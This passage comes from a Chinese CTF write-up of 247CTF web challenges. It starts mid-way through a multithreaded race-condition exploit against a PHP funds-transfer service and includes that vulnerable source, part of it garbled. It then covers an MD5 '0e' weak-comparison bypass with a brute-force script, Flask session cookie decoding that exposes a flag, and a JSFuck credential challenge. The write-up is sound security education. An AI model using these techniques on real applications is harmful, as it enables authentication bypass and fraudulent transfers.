            for i in range(1,30): 
                threading.Thread(target=From1to2,args=(session,)).start()
            for i in range(1,30):
                threading.Thread(target=From2to1,args=(session,)).start()
            for i in range(1,30):
                threading.Thread(target=getFlag,args=(session,)).start()
            for i in range(1,30):
                threading.Thread(target=check,args=(session,)).start()
        event.set()
###  全部代码
    pdo = new SQLite3('/tmp/users.db');
            $this->flag = $flag;
        }
        public function updateFunds($id, $funds)
        {
            $stmt = $this->pdo->prepare('update users set funds = :funds where id = :id');
            $stmt->bindValue(':id', $id, SQLITE3_INTEGER);
            $stmt->bindValue(':funds', $funds, SQLITE3_INTEGER);
            return $stmt->execute();
        }
        public function resetFunds()
        {
            $this->updateFunds(1, 247);
            $this->updateFunds(2, 0);
            return "Funds updated!";
        }
        public function getFunds($id)
        {
            $stmt = $this->pdo->prepare('select funds from users where id = :id');
            $stmt->bindValue(':id', $id, SQLITE3_INTEGER);
            $result = $stmt->execute();
            return $result->fetchArray(SQLITE3_ASSOC)['funds'];
        }
        public function validUser($id)
        {
            $stmt = $this->pdo->prepare('select count(*) as valid from users where id = :id');
            $stmt->bindValue(':id', $id, SQLITE3_INTEGER);
            $result = $stmt->execute();
            $row = $result->fetchArray(SQLITE3_ASSOC);
            return $row['valid'] == true;
        }
        public function dumpUsers()
        {
            $result = $this->pdo->query("select id, funds from users");
            echo "";
            echo "ID FUNDS\n";
            while ($row = $result->fetchArray(SQLITE3_ASSOC)) {
                echo "{$row['id']}  {$row['funds']}\n";
            }
            echo "";
        }
        public function buyFlag($id)
        {
            if ($this->validUser($id) && $this->getFunds($id) > 247) {
                return $this->flag;
            } else {
                return "Insufficient funds!";
            }
        }
        public function clean($x)
        {
            return round((int)trim($x));
        }
    }
    $db = new challDB($flag);
    if (isset($_GET['dump'])) {
        $db->dumpUsers();
    } elseif (isset($_GET['reset'])) {
        echo $db->resetFunds();
    } elseif (isset($_GET['flag'], $_GET['from'])) {
        $from = $db->clean($_GET['from']);
        echo $db->buyFlag($from);
    } elseif (isset($_GET['to'],$_GET['from'],$_GET['amount'])) {
        $to = $db->clean($_GET['to']);
        $from = $db->clean($_GET['from']);
        $amount = $db->clean($_GET['amount']);
        if ($to !== $from && $amount > 0 && $amount validUser($to) && $db->validUser($from) && $db->getFunds($from) >= $amount) {
            $db->updateFunds($from, $db->getFunds($from) - $amount);
            $db->updateFunds($to, $db->getFunds($to) + $amount);
            echo "Funds transferred!";
        } else {
            echo "Invalid transfer request!";
        }
    } else {
        echo highlight_file(__FILE__, true);
    }
## COMPARE THE PAIR——Easy
###  考点
  * PHP md5()弱比较
###  描述
Can you identify a way to bypass our login logic? MD5 is supposed to be a one-way function right?
###  题目分析
经典弱比较，PHP中两个`以0e为开头的数字`的字符串会被认为是科学计数法，找个字符串加盐之后md5是0e开头并且0e之后全为数字即可
用python多线程跑一下
    import hashlib
    import threading
    salt = "f789bbc328a3d1a3"
    def collision(start):
        for i in range(start, start+1000000):
            m = hashlib.md5()
            s = salt + str(i)
            m.update(s.encode())
            r = m.hexdigest()
            if r.startswith("0e") and r[2:].isdigit():
                print(str(i)+ '=>' + s + '=>' + r)
    ths = []
    for i in range(1000):
        tmp = i*1000000
        t = threading.Thread(target=collision, args=(tmp,))
        ths.append(t)
    for i in ths:
        i.start()
    # 237701818=>f789bbc328a3d1a3237701818=>0e668271403484922599527929534016
主要是这个点
  * 在PHP中，以`数字+e`开头，后面全是数字的字符串和数字比较时，会被认为是科学计数法，例如`0e`被识别成0
## SECURED SESSION——Easy考点
  * Flask session解码
###  描述
If you can guess our random secret key, we will tell you the flag securely
stored in your session.
###  题目分析
先是对Flask的初始化，然后设置`SECRET_KEY`是长度24的随机字符串
    import os
    from flask import Flask, request, session
    from flag import flag
    app = Flask(__name__)
    app.config['SECRET_KEY'] = os.urandom(24)
访问`/`返回代码，访问`/flag`则是给出flag，可以看到给出flag的前提是要GET正确的`secret_key`
    @app.route("/flag")
    def index():
        secret_key = secret_key_to_int(request.args['secret_key']) if 'secret_key' in request.args else None
        session['flag'] = flag
        if secret_key == app.config['SECRET_KEY']:
          return session['flag']
        else:
          return "Incorrect secret key!"
在访问`/`对应的逻辑中，是没有对session的操作的，所以访问`/`是不会看到cookie的。先访问`/flag`就可以看到cookie，再用`flask-unsign`就可以解密session
这里我的cookie是`session=eyJmbGFnIjp7IiBiIjoiTWpRM1ExUkdlMlJoT0RBM09UVm1PR0UxWTJGaU1tVXdNemRrTnpNNE5UZ3dOMkk1WVRreGZRPT0ifX0.YBv1UQ.izmpPGtF3K1e9vZR6hYJRfMjRAU;
HttpOnly; Path=/`
直接解码
    flask-unsign --decode --cookie eyJmbGFnIjp7IiBiIjoiTWpRM1ExUkdlMlJoT0RBM09UVm1PR0UxWTJGaU1tVXdNemRrTnpNNE5UZ3dOMkk1WVRreGZRPT0ifX0.YBv1UQ.i zmpPGtF3K1e9vZR6hYJRfMjRAU
    {'flag': b'247CTF{da80795f8a5cab2e037d7385807b9a91}'}
###  全部代码
    import os
    from flask import Flask, request, session
    from flag import flag
    app = Flask(__name__)
    app.config['SECRET_KEY'] = os.urandom(24)
    def secret_key_to_int(s):
        try:
            secret_key = int(s)
        except ValueError:
            secret_key = 0
        return secret_key
    @app.route("/flag")
    def index():
        secret_key = secret_key_to_int(request.args['secret_key']) if 'secret_key' in request.args else None
        session['flag'] = flag
        if secret_key == app.config['SECRET_KEY']:
          return session['flag']
        else:
          return "Incorrect secret key!"
    @app.route('/')
    def source():
        return "
    %s
    " % open(__file__).read()
    if __name__ == "__main__":
        app.run()
## TRUSTED CLIENT——Easy
###  考点
  * JSFuck
###  描述
Developers don’t always have time to setup a backend service when prototyping
code. Storing credentials on the client side should be fine as long as it’s
obfuscated right?
###  题目分析
根据题目可以看出来这是把登陆凭证存储在客户端，但是在请求头和返回头中并没有发现什么有用的信息，倒是有一段JSFuck。
把JSFuck复制出来直接解码就可以了，不过这里是个函数，就不要复制最后面的`()`了
## 参考
  * 
  * 
  * 